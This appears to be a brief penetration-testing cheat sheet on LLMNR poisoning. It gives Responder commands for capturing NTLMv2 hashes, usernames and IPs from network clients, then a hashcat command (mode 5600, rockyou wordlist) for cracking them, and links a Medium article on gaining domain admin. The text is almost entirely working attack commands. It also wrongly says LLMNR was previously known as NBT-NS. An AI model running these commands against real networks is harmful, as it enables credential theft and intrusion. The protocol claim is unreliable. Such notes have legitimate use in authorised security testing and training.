
+ Link Local Multicast Name Resolution
+ Previously known as NBT-NS
+ Just like DNS(Used when DNS Fails)

1. Run Responder
```sh
$ responder -I <interface> -rdwv
# wait for an event to occur
# client details including IP,username and password hash will be captured by responder when an event is occured.
# event in sense when the server fails to resolve a address request.
```

2. We got the NTLMv2 password hash now, lets crack it with Hashcat
```sh
$ hashcat -m 5600 <hashfile.txt> <passwordlist:rockyou.txt> -O
# 5600 - netNTLMv2
# wait for the password to be cracked
```
















#### Referece: https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa